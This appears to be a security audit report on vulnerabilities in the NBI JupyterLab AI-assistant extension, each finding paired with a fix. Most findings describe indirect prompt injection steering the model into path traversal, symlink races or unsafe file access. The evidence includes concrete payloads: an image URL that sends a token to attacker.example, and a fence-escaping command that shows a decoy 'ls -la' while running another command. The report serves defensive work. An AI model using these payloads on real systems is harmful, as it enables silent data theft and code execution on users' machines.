findings.title: search_files / list_files (nbi-file-read toolset) glob `pattern` argument is not containment-checked, so a `..`-bearing pattern escapes jupyter_root_dir -> arbitrary workspace-external file read/enumeration
findings.attacker_model: Indirect prompt injection: untrusted content the user asks Claude/NBI to work with (malicious notebook cell/data file, README in a cloned repo, third-party GitHub skill body, or an MCP tool result) steers the LLM into calling the FileRead tools with a crafted `pattern`. Attacker is NOT the user.
findings.attack_path: Both tools sandbox only the `directory` arg via safe_jupyter_path, then pass the LLM-supplied `pattern` straight into search_dir.glob(pattern); Path.glob honors `..` segments and follows symlinks, yielding paths outside the root. search_files then does `except ValueError: rel_path = file_path` and still open()s and returns the contents; list_files enumerates them. content_pattern='.' matches every line -> full arbitrary read. read_file is NOT affected (routes its path through safe_jupyter_path).
findings.impact: Complete bypass of the workspace sandbox these tools advertise: read SSH keys, ~/.aws/credentials, /etc/passwd, and — on a shared JupyterHub node — other tenants' files, bounded only by the server process's own permissions. Results flow back into the chat/LLM (exfiltration channel).
findings.evidence: Reproduced on Python 3.11.15: root.glob('../creds/aws') returns the outside file; search_files(pattern='../creds/aws', content_pattern='.') returned the outside file's line contents; list_files(pattern='../creds/*') enumerated the outside dir; a workspace-internal symlink to /etc/hostname was also read. search_files L343 (except ValueError: rel_path=file_path) + L346 open(); list_files L440/L443 glob.
findings.fix: Filter every glob hit through the existing containment chokepoint before use: keep only matches for which safe_jupyter_path(str(f)) succeeds (it resolves `..` and symlinks then checks relative_to(root)). Closes the `..` vector and the symlink variant together; prepared as a 33/-2 patch to built_in_toolsets.py, verified to block traversal while preserving legitimate in-workspace globbing.

findings.title: Chat markdown renderer emits LLM-supplied image URLs as live src, giving indirect prompt injection a zero-click outbound exfiltration channel
findings.attacker_model: Indirect prompt injection: untrusted content the user asks NBI to work with (a notebook cell or its output, a data file or README in the workspace, a page or record returned by an MCP tool, a third-party GitHub skill body) steers the model's reply. The attacker is NOT the user and never touches the browser.
findings.attacker_controlled_input: the assistant markdown streamed into the chat sidebar -- specifically the URL inside a CommonMark image node the injected text tells the model to emit
findings.attack_path: MarkdownRenderer (src/markdown-renderer.tsx) overrides react-markdown's `a` node with MarkdownLink/SafeAnchor (scheme allowlist, _blank, docmanager routing) and deliberately omits rehype-raw, but leaves the `img` node on react-markdown's default renderer. defaultUrlTransform strips only dangerous schemes, so any http(s) URL reaches the DOM as . Unlike an anchor an image needs no click: the browser issues the GET the moment the streamed node renders. The model can therefore be steered to append `![](https://attacker.tld/x?d=)` and the request leaves the machine silently. Every chat surface is affected -- item.content, item.reasoningContent and item.contentDetail.content in chat-sidebar.tsx all render through the same component -- and no CSP anywhere in the extension or jupyter-config constrains img-src.
findings.impact: Silent off-host exfiltration of anything in the model's context: workspace file contents the file-read tools pulled in, notebook cell outputs, chat history, and any secret the model was shown, plus the user's IP and User-Agent. Zero user interaction, no visible artifact beyond a broken-image glyph. This is the channel the anchor hardening (SafeAnchor, no rehype-raw, MarkdownLink) was built to close, reached through the one markdown node that was not covered.
findings.evidence:
Reproduced against react-markdown 9.0.1 (the pinned version) with the project's own plugin set (remark-gfm, remark-breaks) and an `a` override, renderToStaticMarkup: '![](https://attacker.example/log?d=SECRET_TOKEN_abc123)' -> '

'. Raw '' HTML is escaped as expected (no rehype-raw) and '![x](javascript:alert(1))' is stripped to src="" by defaultUrlTransform -- confirming the markdown image node is the sole live sink. grep over src/ and style/ found no img override, no urlTransform, and no Content-Security-Policy.
findings.fix: Added src/components/markdown-image.tsx (MarkdownImage) and wired it as the `img` component in MarkdownRenderer: no `src` reaches the DOM, the image renders as inert alt text plus an SR-only '(image blocked)' note mirroring SafeAnchor's blocked-link treatment, and alt/title go through the same hasDangerousTextCodepoints scrub SafeAnchor applies. No functionality lost -- raw HTML never renders, data: URIs were already stripped, and notebook figures use the dedicated image response stream, not chat markdown. 5 new cases in tests/ts/markdown-renderer.test.tsx.

findings.title: Claude-mode Bash approval prompt renders the model-supplied command inside an escapable markdown code fence, so a prompt-injected command forges a decoy command block next to the Approve button and obtains the user's approval for arbitrary shell execution
findings.attacker_model: Indirect prompt injection: the author of any untrusted content the model consumes -- a shared notebook's cell source or output, a README or data file in the workspace, a record returned by an MCP tool, a third-party GitHub skill body. This is the same attacker the repo already builds against (cell_output.py's nonced envelope, NBI-2026-006, NBI-2026-007). The attacker is NOT the user and never touches the browser.
findings.attacker_controlled_input: the `command` (and `description`) field of the Bash tool call the injected text steers Claude into emitting
findings.attack_path:
In Claude mode every Bash tool call is gated by a human approval prompt. _custom_permission_handler streams MarkdownData(f"✓ **{description}**
```shell
{command}
```") and then a ConfirmationData whose message is 'Approve Bash tool to execute the command above?'. The command is interpolated into a FIXED three-backtick fence with no neutralization, and chat-sidebar.tsx renders that markdown through MarkdownRenderer (react-markdown 9.0.1 + remark-gfm + remark-breaks). A command whose text contains a line of three backticks therefore CLOSES the fence early: everything after it renders as ordinary markdown -- attacker-chosen prose and a second, innocuous-looking ```shell block -- positioned between the real command and the Approve button that the confirmation text points at. The user reads the decoy adjacent to the button and approves; the permission handler returns PermissionResultAllow() with no updated_input, so the claude-agent-sdk executes the ORIGINAL single `command` string, payload first line included. `description` is the same sink via **{description}** (a newline in it starts a new markdown block just as effectively).
findings.impact: Defeats the last control standing between prompt injection and arbitrary command execution. NBI's threat model accepts that the shell runs as the user with no privilege boundary (SECURITY.md) precisely BECAUSE a human approves each command; forging what that human reads converts a click on a command they believe is `ls -la` into arbitrary code execution as the user -- credential theft, workspace exfiltration, persistence. Bypasses the approval gate rather than any sandbox.
findings.evidence:
Reproduced against the pinned renderer stack (react-markdown 9.0.1, remark-gfm 4.0.0, remark-breaks 4.0.0, renderToStaticMarkup) using the exact server template. command = "echo PWNED > /tmp/pwned.txt : <<'MD' ``` Approve the read-only listing below: ```shell ls -la" renders as TWO 
 blocks separated by 
Approve the read-only listing below:
, with `ls -la` as the block adjacent to the Approve button. Running that same string through bash (as the tool does) wrote PWNED to /tmp/pwned.txt, with only a here-document warning on stderr -- i.e. the decoy is what the user reads and the payload is what runs. Sink at claude.py Bash branch of _custom_permission_handler (the pre-fix one-liner streaming MarkdownData); it is the ONLY site in the server that interpolates model-supplied text into a markdown fence -- grep over notebook_intelligence/ shows every other confirmation path uses json.dumps(tool_args), which is single-line and cannot forge a block. That the codebase already ships _neutralize_close_tag in cell_output.py for the identical delimiter-forgery problem is evidence this is a control gap, not a missing nicety.
findings.fix: Added _untrusted_code_block() and _inline_untrusted_text() to claude.py and routed the Bash approval prompt through them. _untrusted_code_block opens the fence with one more backtick than the longest backtick run in the content, which CommonMark guarantees the content cannot terminate; _inline_untrusted_text folds `description` onto a single line so a newline cannot start a new block. Verified with the pinned renderer: the injected payload now renders as exactly ONE code block containing the whole command verbatim, with no prose escaping. Regression suite tests/test_claude_bash_approval_rendering.py.

findings.title: ACP client fs/read_text_file and fs/write_text_file pass the agent-supplied path straight to open(), so an LLM-chosen absolute path or '..' traversal reads or overwrites any file the Jupyter user owns, with no approval prompt
findings.attacker_model: Indirect prompt injection against the ACP-mode agent (poisoned notebook, README, dependency doc, or fetched web content the agent reads while working in the workspace).
findings.attacker_controlled_input: The `path` argument on ACP fs/read_text_file and fs/write_text_file requests, chosen by the agent's model.
findings.attack_path: AcpAgentClient._serve advertises schema.FileSystemCapabilities(read_text_file=True, write_text_file=True) at initialize and opens the session with cwd=get_jupyter_root_dir(). fs/* are ACP CLIENT methods invoked by the agent directly -- they never pass through _NbiAcpClient.request_permission, so nothing prompts the user. _NbiAcpClient.read_text_file did `open(path)` and write_text_file did `os.makedirs(os.path.dirname(path)); open(path,'w')` with no containment check, ignoring the session cwd. safe_jupyter_path -- whose own docstring calls it 'the single chokepoint every tool / handler should funnel an LLM-supplied path through' -- was not applied.

findings.title: The built-in file tools (read_file / insert_content / write_to_file) confine the LLM-supplied path with safe_jupyter_path and then re-open the resolved path by name, so a file or directory component replaced by a symlink between the two resolutions is followed and an approved workspace write lands on any file the server user can write
findings.attacker_model: A local user or process with write access to a directory inside the victim's Jupyter workspace root on a shared host (JupyterHub shared project/scratch dirs, group-writable NFS homes). Secondarily an LLM under indirect prompt injection (hostile file/AGENTS.md/MCP result) steered to edit the attacker-placed file.
findings.attacker_controlled_input: The attacker-placed file's full content, and the timing of a rename(2) that replaces that file (or a parent directory) with a symlink to a victim-writable file (~/.bashrc, ~/.ssh/authorized_keys, ~/.jupyter/jupyter_server_config.py). The victim's LLM only has to call insert_content/write_to_file on the workspace-relative path; the approval card (api.py ~797/1040-1050) shows only that path plus the inserted line.
findings.attack_path: built_in_toolsets.py insert_content (~L787-811): _get_safe_path -> util.safe_jupyter_path (~L80-95) Path.resolve()+relative_to(root) returns the resolved path -> exists()/is_file() -> open(target_file,'r').readlines() (attacker sees IN_OPEN/IN_CLOSE_NOWRITE via inotify) -> list processing whose duration scales with the attacker-chosen file size -> open(target_file,'w') resolves the name a SECOND time inside open(2), follows the swapped symlink, truncates and writes the attacker's content plus one line. write_to_file (~L826-833: resolve -> parent.mkdir -> open('w')) and read_file (~L745-755) have the same resolve-then-open-by-name pattern with a smaller window. No O_NOFOLLOW, no openat/dir_fd, no post-open fstat/identity check anywhere in the module.
findings.impact: Arbitrary file write with attacker-controlled content as the Jupyter server user outside the workspace -> code execution as the victim (dotfiles, authorized_keys, server config). read_file variant: read of any victim-readable file into the LLM context. CVSS ~6.3 (AV:L/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H) -> medium.
findings.evidence: Verified at c5d2df7: built_in_toolsets.py L745-755 read_file, L787-811 insert_content, L826-833 write_to_file all `open(target_file, ...)` on the path returned by safe_jupyter_path; util.py L80-95 returns target_path.resolve() with no fd. grep -rn O_NOFOLLOW|F_GETPATH|/proc/self/fd notebook_intelligence/ -> no hits. Regression tests in tests/test_builtin_file_tools_symlink_swap.py reproduce the swapped-file and swapped-parent-directory cases (fail on the unfixed code, pass on the fix).
findings.fix: util.open_confined(target, write): os.open with O_NOFOLLOW|O_CLOEXEC (no O_TRUNC), fstat must be S_ISREG, compare os.readlink(/proc/self/fd/N) (or fcntl F_GETPATH on macOS) realpath against the confined target and raise ValueError on mismatch, only then ftruncate for writes; the three tools call it. findings.title: The ACP adapter is launched as `npx -y @zed-industries/codex-acp@0.16.0` with the JupyterLab root as its process cwd, so a workspace shipping node_modules/@zed-industries/codex-acp at the pinned version (or an .npmrc that points npm at another registry) chooses what runs as the agent on session creation, before any approval prompt
findings.attacker_model: Whoever can write to the directory JupyterLab serves as its root: a hostile repository the user cloned and opened as the workspace (jupyter lab --notebook-dir=<checkout>, or a JupyterHub spawner rooted at a shared/group-writable project dir). Same attacker as the fixed-upstream `-m` shadowing finding (937302d).
findings.attacker_controlled_input: Either (a) node_modules/@zed-industries/codex-acp/package.json declaring version 0.16.0 with a bin entry, plus node_modules/.bin/codex-acp (git stores the symlink or an executable script), or (b) an .npmrc at the root (registry= or @zed-industries:registry=) on a machine whose ~/.npm/_npx cache does not already hold the package. No prompt, model cooperation, or approval needed.
findings.attack_path: acp_registry.resolve_acp_agent_command -> ['npx','-y','@zed-industries/codex-acp@0.16.0']; acp_agent.AcpAgentClient._serve: workdir = get_jupyter_root_dir(); asyncio.create_subprocess_exec(*cmd, cwd=workdir, env=os.environ minus CLAUDE_CODE_*). npm exec (libnpmexec, npm 10.9.7) resolves the spec against the local project tree found by walking up from cwd and runs a satisfying installed copy without contacting the registry; project .npmrc from the same walk sets the registry used for a fetch. Trigger is session creation itself (first chat turn in ACP/Codex mode, _ensure_started -> _serve), which precedes ACP initialize/authenticate/new_session and therefore codex's approval_policy=untrusted pin and NBI's request_permission card. Precondition: NBI_ACP_MODE_POLICY not force-off (default is force-off; user-choice/force-on deployments are exposed) and Node/npx present, which ACP mode requires.
findings.impact: Arbitrary code execution as the Jupyter user, outside codex's sandbox and with the Jupyter server's environment (OPENAI_API_KEY is injected into the child env by _child_env when configured), on first use of ACP mode against an untrusted workspace. Same class and severity as the fixed-upstream `python -m notebook_intelligence.acp_mcp_server` shadowing (high); CVSS ~7.8 (local, low complexity, user interaction = opening the checkout and starting a session).
findings.evidence: Verified at ee285a5: acp_agent.py L853 workdir=get_jupyter_root_dir(), L871-874 create_subprocess_exec(..., cwd=workdir), L910-929 _child_env inherits os.environ; acp_registry.py L82-95 default command. Reproduced in a scratch workspace with npm 10.9.7: (1) planted node_modules/@zed-industries/codex-acp@0.16.0 + .bin symlink -> `npx -y @zed-industries/codex-acp@0.16.0` from that cwd printed 'EVIL RAN' and wrote the marker without any network access; (2) .npmrc registry=http://127.0.0.1:9/ -> the fetch went to http://127.0.0.1:9/@zed-industries%2fcodex-acp (ECONNREFUSED), i.e. the workspace picked the registry. Prior memory (2026-09-13 record, related_hardening) had reasoned this but never traced, reproduced, or filed it; the maintainer merged the twin `-m` fix (937302d, in 6.0.0), so the model is accepted upstream.
findings.fix: acp_agent.py: new _adapter_cwd() returns nbi_config.nbi_user_dir (~/.jupyter/nbi, user-owned, created if absent) and _serve spawns the adapter there; session/new and session/load keep cwd=get_jupyter_root_dir() so the agent's workspace is unchanged.
